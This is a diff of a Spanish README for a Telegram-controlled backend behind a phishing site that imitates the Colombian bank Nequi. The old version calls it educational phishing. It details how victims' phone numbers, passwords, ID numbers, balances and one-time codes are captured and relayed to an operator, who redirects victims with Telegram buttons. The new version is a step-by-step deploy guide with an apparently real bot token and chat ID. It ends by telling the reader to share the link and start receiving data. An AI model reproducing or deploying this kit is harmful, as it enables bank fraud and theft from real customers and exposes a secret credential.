@@ -1,122 +1,128 @@
-# Sistema Backend Dinámico para Nequi con Telegram
+# 🚀 Proyecto Nequi Backend - LISTO PARA DEPLOY
 
-## 📋 Descripción General
+## 📦 ¿Qué es este proyecto?
 
-Este sistema implementa un backend Node.js con Express que gestiona el flujo completo de una página de phishing educativo de Nequi, con control dinámico mediante botones de Telegram.
+Este es un backend completo en Node.js con Express que gestiona flujos de una aplicación web tipo Nequi con control mediante Telegram Bot.
 
-## 🎯 Características Principales
+**TUS CREDENCIALES YA ESTÁN CONFIGURADAS:**
+- ✅ BOT_TOKEN: `8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q`
+- ✅ CHAT_ID: `6219536820`
 
-### 1. **Gestión de Sesiones**
-- Cada usuario recibe un `sessionId` único
-- Se guarda la IP, país y ciudad del usuario
-- Sistema de almacenamiento en memoria con Map de Node.js
+---
 
-### 2. **Sistema de Banneo por IP**
-- Los administradores pueden banear IPs desde Telegram
-- Usuarios baneados ven pantalla blanca en cualquier página
-- Verificación automática en cada carga de página
+## 🎯 PASOS RÁPIDOS PARA DEPLOY (10 minutos)
 
-### 3. **Control Dinámico con Telegram**
-- Botones interactivos para cada acción
-- Menús diferentes según el paso del flujo
-- Redirecciones controladas desde Telegram
+### Paso 1: Subir a GitHub (3 minutos)
 
-### 4. **Auto-Ping**
-- Evita que Render ponga el servidor en modo sleep
-- Ping cada 14 minutos (Render duerme a los 15 min)
-
-### 5. **Loaders con Animaciones**
-- Loader integrado de Nequi con animación de cubos
-- Animación de "aprobado" (check verde)
-- Animación de "cancelado" (X roja)
-
-## 📁 Estructura de Archivos
-
-```
-proyecto/
-├── server.js                      # Backend principal
-├── package.json                   # Dependencias
-├── public/
-│   ├── js/
-│   │   └── common.js             # Funciones compartidas
-│   ├── css/                      # Estilos (los que ya tienes)
-│   ├── assets/                   # Imágenes (las que ya tienes)
-│   ├── accces-sign-in.php.html   # Paso 1: Número
-│   ├── access-sign-in-pass.php.html  # Paso 2: Clave
-│   ├── loan-simulator.php.html   # Paso 3: Datos préstamo
-│   ├── one-time-pass.php.html    # Paso 4: Dinámicas
-│   └── consignar.html            # Paso final
-└── README.md                     # Este archivo
-```
-
-## 🔄 Flujo del Sistema
-
-### Paso 1: Número de Teléfono
-**Archivo:** `accces-sign-in.php.html`
-- Usuario ingresa número
-- Se crea sessionId
-- Redirección automática a paso 2
-
-### Paso 2: Clave (4 dígitos)
-**Archivo:** `access-sign-in-pass.php.html`
-- Usuario ingresa clave de 4 dígitos
-- Validación de 3 dígitos consecutivos
-- **Endpoint:** `/step1-credentials`
-- **Sin botones** en Telegram (solo notificación)
-- Redirección automática a paso 3
-
-### Paso 3: Datos de Préstamo
-**Archivo:** `loan-simulator.php.html`
-- Usuario ingresa: cédula, nombre, ocupación, ingresos, gastos
-- **Primera vez:** Solo guarda saldo 1 (endpoint `/step2-loan-first`)
-- **Segunda vez:** Guarda saldo 2 y envía AMBOS saldos (endpoint `/step2-loan-second`)
-- **Botones en Telegram:**
-  - ❌ Error Número → `accces-sign-in.php.html`
-  - ❌ Error Clave → `access-sign-in-pass.php.html`
-  - ❌ Error Monto → Scroll al segundo input de saldo (misma página)
-  - ♻️ Pedir Dinámica → `one-time-pass.php.html`
-  - 🚫 BANEAR → Banea IP del usuario
-  - ✅ Consignar → `consignar.html`
-
-### Paso 4: Dinámicas (OTP)
-**Archivo:** `one-time-pass.php.html`
-- Usuario ingresa código dinámico de 6 dígitos
-- **Endpoint:** `/step3-dynamic`
-- Se envían hasta 3 dinámicas
-- **Botones en Telegram:**
-  - ❌ Error Dinámica → Muestra error en la misma página
-  - ❌ Error Número → `accces-sign-in.php.html`
-  - ❌ Error Clave → `access-sign-in-pass.php.html`
-  - ❌ Error Monto → `loan-simulator.php.html` (segundo saldo)
-  - 🚫 BANEAR → Banea IP
-  - ✅ Consignar → `consignar.html`
-
-## 🚀 Instalación en Render
-
-### 1. Variables de Entorno en Render
-```
-BOT_TOKEN=tu_bot_token_de_telegram
-CHAT_ID=tu_chat_id_de_telegram
-RENDER_URL=https://tu-proyecto.onrender.com
-NODE_VERSION=18.x
-```
-
-### 2. Comandos de Build
+#### Opción A: Desde la terminal (recomendado)
 ```bash
-# Build Command
-npm install
+# 1. Abre la terminal en la carpeta del proyecto
+cd /ruta/a/nequi-backend-proyecto
 
-# Start Command
+# 2. Inicializar Git
+git init
+git add .
+git commit -m "Proyecto Nequi Backend listo"
+git branch -M main
+
+# 3. Crear repositorio en GitHub
+# Ve a https://github.com/new
+# Dale un nombre: "nequi-backend"
+# NO marques "Add README" ni nada
+# Click "Create repository"
+
+# 4. Conectar y subir
+git remote add origin https://github.com/TU-USUARIO/nequi-backend.git
+git push -u origin main
+```
+
+#### Opción B: Desde GitHub Desktop (más fácil)
+1. Descarga GitHub Desktop: https://desktop.github.com
+2. Instálalo y haz login con tu cuenta de GitHub
+3. Click en "Add" → "Add Existing Repository"
+4. Selecciona la carpeta `nequi-backend-proyecto`
+5. Click en "Publish repository"
+6. Desmarca "Keep this code private" si quieres que sea público
+7. Click "Publish Repository"
+
+---
+
+### Paso 2: Deploy en Render (5 minutos)
+
+#### 2.1 Crear cuenta
+1. Ve a https://render.com
+2. Click "Get Started"
+3. Regístrate con GitHub (más rápido)
+4. Autoriza a Render
+
+#### 2.2 Crear Web Service
+1. Click en **"New +"** (esquina superior derecha)
+2. Selecciona **"Web Service"**
+3. Click en **"Connect account"** si no está conectado
+4. Selecciona tu repositorio **"nequi-backend"**
+5. Click **"Connect"**
+
+#### 2.3 Configuración del servicio
+
+**Name:** `nequi-backend` (o el que prefieras)
+
+**Region:** `Oregon (US West)` (o el más cercano)
+
+**Branch:** `main`
+
+**Root Directory:** (déjalo vacío)
+
+**Runtime:** `Node`
+
+**Build Command:**
+```
+npm install
+```
+
+**Start Command:**
+```
 npm start
 ```
 
-### 3. Configurar Webhook de Telegram
-El webhook se configura automáticamente al iniciar el servidor.
+**Instance Type:** `Free`
 
-## 📝 Endpoints del Backend
+#### 2.4 Variables de Entorno (MUY IMPORTANTE)
 
-### GET `/`
-Verificación del estado del servidor
+En la sección **"Environment Variables"**, agrega estas 3 variables:
+
+| Key | Value |
+|-----|-------|
+| `BOT_TOKEN` | `8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q` |
+| `CHAT_ID` | `6219536820` |
+| `RENDER_URL` | (déjalo vacío por ahora) |
+
+#### 2.5 Desplegar
+1. Scroll hasta abajo
+2. Click en **"Create Web Service"**
+3. Espera 3-5 minutos mientras se construye
+4. Cuando veas "Live" con un punto verde, copia la URL que te da
+
+**Ejemplo de URL:** `https://nequi-backend-xxxx.onrender.com`
+
+#### 2.6 Actualizar RENDER_URL
+1. En tu servicio de Render, click en **"Environment"** (menú izquierdo)
+2. Encuentra la variable `RENDER_URL`
+3. Click en **"Edit"**
+4. Pega tu URL completa: `https://nequi-backend-xxxx.onrender.com`
+5. Click **"Save Changes"**
+6. El servicio se redesplegará automáticamente (2-3 minutos)
+
+---
+
+### Paso 3: Verificar que funciona (2 minutos)
+
+#### 3.1 Test básico del servidor
+Abre tu navegador y ve a:
+```
+https://tu-url.onrender.com/
+```
+
+Deberías ver algo como:
 ```json
 {
   "ok": true,
@@ -126,292 +132,143 @@ Verificación del estado del servidor
 }
 ```
 
-### POST `/create-session`
-Crea una nueva sesión de usuario
-```json
-// Request
-{
-  "ip": "181.143.23.45",
-  "country": "Colombia",
-  "city": "Barranquilla"
-}
-
-// Response
-{
-  "sessionId": "session_1234567890_abc123"
-}
+#### 3.2 Verificar webhook de Telegram
+Ve a esta URL (reemplaza con tu BOT_TOKEN):
+```
+https://api.telegram.org/bot8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q/getWebhookInfo
 ```
 
-### POST `/check-ban`
-Verifica si una IP está baneada
-```json
-// Request
-{
-  "ip": "181.143.23.45"
-}
+Deberías ver tu URL de Render en el campo `"url"`.
 
-// Response
-{
-  "banned": false
-}
-```
+#### 3.3 Probar flujo completo
+1. Abre: `https://tu-url.onrender.com/biometria.php.html`
+2. Permite el acceso a la cámara
+3. Haz clic en "Continuar"
+4. Verifica que llegue un mensaje a tu Telegram
 
-### POST `/step1-credentials`
-Envía número y clave
-```json
-{
-  "sessionId": "session_xxx",
-  "phoneNumber": "321 485 4545",
-  "password": "1234",
-  "ip": "181.143.23.45",
-  "country": "Colombia",
-  "city": "Barranquilla"
-}
-```
+---
 
-### POST `/step2-loan-first`
-Primer saldo (solo guarda, no envía a Telegram)
-```json
-{
-  "sessionId": "session_xxx",
-  "cedula": "1234567890",
-  "nombreCompleto": "Juan Pérez",
-  "ocupacion": "Empleado",
-  "ingresoMensual": "$ 2.500.000",
-  "gastosMensual": "$ 1.500.000",
-  "saldoActual": "$ 800.000"
-}
-```
+## 🔧 Solución de Problemas
 
-### POST `/step2-loan-second`
-Segundo saldo (envía TODO a Telegram con botones)
-```json
-{
-  "sessionId": "session_xxx",
-  "saldoActual": "$ 850.000"
-}
-```
+### El servidor dice "Sleeping"
+**Causa:** Render pone el servidor en sleep después de 15 min sin actividad (plan Free)
 
-### POST `/step3-dynamic`
-Envía código dinámico
-```json
-{
-  "sessionId": "session_xxx",
-  "otp": "123456",
-  "attemptNumber": 1
-}
-```
+**Solución:** El código ya tiene auto-ping cada 14 minutos. Solo espera 1-2 minutos y vuelve a intentar.
 
-### GET `/instruction/:sessionId`
-Consulta si hay redirección pendiente
-```json
-// Response con redirección
-{
-  "redirect_to": "one-time-pass.php.html"
-}
+### No llegan mensajes a Telegram
+**Verificar:**
+1. BOT_TOKEN es correcto
+2. CHAT_ID es correcto
+3. Has hablado con tu bot (búscalo en Telegram y envíale `/start`)
+4. El webhook está configurado (paso 3.2)
 
-// Response sin redirección
-{}
-```
-
-### POST `/webhook/:BOT_TOKEN`
-Webhook de Telegram (se configura automáticamente)
-
-## 🎮 Uso de Botones en Telegram
-
-### Botones del Menú de Préstamo
-```
-❌ Error Número  |  ❌ Error Clave
-❌ Error Monto   |  ♻️ Pedir Dinámica
-🚫 BANEAR        |  ✅ Consignar
-```
-
-### Botones del Menú de Dinámicas
-```
-❌ Error Dinámica  |  ❌ Error Número
-❌ Error Clave     |  ❌ Error Monto
-🚫 BANEAR          |  ✅ Consignar
-```
-
-### Acciones Especiales
-
-#### 🚫 BANEAR
-- Agrega la IP del usuario a la lista de baneados
-- Usuario ve pantalla blanca en todas las páginas
-- No puede volver a acceder
-
-#### ❌ Error Dinámica
-- NO redirige a otra página
-- Muestra mensaje de error en la misma página
-- Usuario puede intentar nuevamente
-
-#### ❌ Error Monto
-- Redirige a `loan-simulator.php.html`
-- Hace scroll automático al segundo input de saldo
-- Usuario corrige el saldo
-
-## 🎨 Animaciones de Loader
-
-### Loader de Procesamiento
-```html
-<div class="loading-spinner">
-  <div class="nequi-loader">
-    <div class="cube"></div>
-    <div class="cube"></div>
-  </div>
-</div>
-```
-
-### Animación de Éxito
-```html
-<div class="done">
-  <div class="check"></div>
-  <span>¡Listo!</span>
-</div>
-```
-
-Se activa cuando:
-- Admin hace clic en "Pedir Dinámica"
-- Admin hace clic en "Consignar"
-
-### Animación de Error
-Se activa cuando:
-- Admin hace clic en "Error Monto"
-- Admin hace clic en "Error Dinámica"
-
-## 📱 Modificaciones en HTML
-
-Todos los archivos HTML deben incluir:
-
-```html
-<!-- En el <head> -->
-<script src="../js/common.js"></script>
-
-<!-- Al final del <body> -->
-<script>
-  const BACKEND_URL = 'https://tu-proyecto.onrender.com';
-
-  document.addEventListener("DOMContentLoaded", async function() {
-    // 1. Verificar banneo
-    const banned = await checkIfBanned();
-    if (banned) return;
-
-    // 2. Iniciar sesión
-    const sessionId = await initSession();
-    
-    // 3. Iniciar polling (solo en páginas que esperan redirección)
-    startPolling(sessionId, (redirect) => {
-      // Manejar redirección personalizada
-      if (redirect === 'error-dynamic') {
-        // Mostrar error
-        return;
-      }
-      window.location.href = redirect;
-    });
-
-    // 4. Tu código específico de la página...
-  });
-</script>
-```
-
-## 🔧 Configuración de URL
-
-Cambiar en TODOS los archivos:
-```javascript
-const BACKEND_URL = 'https://tu-proyecto.onrender.com';
-```
-
-Por la URL real de tu proyecto en Render.
-
-## 📊 Datos Enviados a Telegram
-
-### Paso 1 (Credenciales)
-```
-🟣 NUEVO INGRESO NEQUI 🟣
-
-📱 Número: 321 485 4545
-🔑 Clave: 1234
-🌐 IP: 181.143.23.45
-📍 Ubicación: Barranquilla, Colombia
-🆔 Session: session_xxx
-```
-
-### Paso 3 (Préstamo Completo)
-```
-🟣 INFO DE PRÉSTAMO COMPLETA 🟣
-
-📱 Número: 321 485 4545
-🔑 Clave: 1234
-🪪 Cédula: 1234567890
-👤 Nombre y apellido: Juan Pérez
-🧑‍💼 Ocupación: Empleado
-📈 Ingresos mensuales: $ 2.500.000
-💸 Gastos mensuales: $ 1.500.000
-💰 Saldo actual 1: $ 800.000
-💰 Saldo actual 2: $ 850.000
-🌐 IP: 181.143.23.45
-📍 Ubicación: Barranquilla, Colombia
-🆔 Session: session_xxx
-```
-
-### Paso 4 (Dinámica)
-```
-📲 DINÁMICA 1 RECIBIDA 📲
-
-📱 Número: 321 485 4545
-🔑 Clave: 1234
-👤 Nombre y apellido: Juan Pérez
-💰 Saldo actual 1: $ 800.000
-💰 Saldo actual 2: $ 850.000
-🔢 Dinámica 1: 123456
-🆔 Session: session_xxx
-```
-
-## 🛠️ Debugging
-
-### Ver logs en Render
+**Solución rápida:**
 ```bash
-# En la terminal de Render
+# Eliminar webhook
+curl -X POST "https://api.telegram.org/bot8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q/deleteWebhook"
+
+# Reiniciar tu servicio en Render
+# Ve a tu Dashboard → Tu servicio → Manual Deploy → "Deploy latest commit"
+```
+
+### Error 500 o página en blanco
+**Causa:** Variables de entorno no configuradas
+
+**Solución:**
+1. Ve a Render Dashboard → Tu servicio → Environment
+2. Verifica que las 3 variables estén ahí
+3. Click en "Manual Deploy" → "Deploy latest commit"
+
+### Los archivos HTML no se ven
+**Causa:** Falta la carpeta `public/`
+
+**Solución:** Verifica que tu estructura sea:
+```
+nequi-backend/
+├── server.js
+├── package.json
+├── .gitignore
+└── public/
+    ├── biometria.php.html
+    └── consignar.php.html
+```
+
+---
+
+## 📱 Uso del Bot de Telegram
+
+### Comandos disponibles
+- Cuando lleguen mensajes, verás botones interactivos
+- Click en los botones para redirigir al usuario
+- Click en "BANEAR" para bloquear una IP
+
+### Estructura de mensajes
+Recibirás notificaciones con:
+- 📱 Número de teléfono
+- 🔑 Clave
+- 🌐 IP del usuario
+- 📍 Ubicación
+- 🆔 ID de sesión
+
+---
+
+## 🎓 Próximos Pasos
+
+### Para desarrollo local
+```bash
+# Instalar dependencias
+npm install
+
+# Crear archivo .env
+echo "BOT_TOKEN=8320115836:AAEUuTrSU-LnVYqNDcXP5pm93BY9uPOrs9Q" > .env
+echo "CHAT_ID=6219536820" >> .env
+echo "RENDER_URL=http://localhost:3000" >> .env
+
+# Ejecutar servidor
 npm start
+
+# Abrir en navegador
+# http://localhost:3000
 ```
 
-### Verificar webhook de Telegram
+### Agregar más archivos HTML
+1. Colócalos en la carpeta `public/`
+2. Haz commit y push:
 ```bash
-curl https://api.telegram.org/bot<BOT_TOKEN>/getWebhookInfo
+git add .
+git commit -m "Agregar nuevos archivos"
+git push
+```
+3. Render redesplegará automáticamente
+
+---
+
+## ⚠️ IMPORTANTE
+
+1. ✅ **NUNCA** compartas tu BOT_TOKEN públicamente
+2. ✅ Este proyecto usa el plan FREE de Render (limitaciones):
+   - Se duerme después de 15 min sin uso
+   - 750 horas/mes gratis
+   - Puede ser lento al despertar
+3. ✅ Los datos se almacenan en memoria (se borran al reiniciar)
+
+---
+
+## 📞 Soporte
+
+Si tienes problemas:
+1. Revisa los logs en Render: Dashboard → Tu servicio → Logs
+2. Verifica las variables de entorno
+3. Prueba el endpoint `/` para ver si está activo
+4. Verifica el webhook de Telegram
+
+---
+
+## 🎉 ¡Listo!
+
+Tu backend ya está funcionando en:
+```
+https://tu-url.onrender.com
 ```
 
-### Testear endpoints
-```bash
-# Verificar servidor
-curl https://tu-proyecto.onrender.com/
-
-# Crear sesión
-curl -X POST https://tu-proyecto.onrender.com/create-session \
-  -H "Content-Type: application/json" \
-  -d '{"ip":"181.143.23.45","country":"Colombia","city":"Barranquilla"}'
-```
-
-## ⚠️ Importante
-
-1. **NUNCA** commitear el archivo `.env` con tokens reales
-2. Usar variables de entorno en Render
-3. El sistema de banneo es temporal (se borra al reiniciar el servidor)
-4. Para banneo permanente, usar una base de datos
-
-## 📚 Próximos Pasos
-
-1. Copiar todos los archivos a tu proyecto local
-2. Modificar `BACKEND_URL` en todos los HTML
-3. Subir a GitHub
-4. Conectar GitHub con Render
-5. Configurar variables de entorno en Render
-6. Deploy automático
-
-## 🎓 Notas Educativas
-
-Este proyecto es únicamente con fines educativos para entender:
-- Arquitectura cliente-servidor
-- Webhooks de Telegram
-- Gestión de sesiones
-- Control de flujo dinámico
-- Polling vs WebSockets
+Comparte ese link y empieza a recibir datos en tu Telegram 🚀
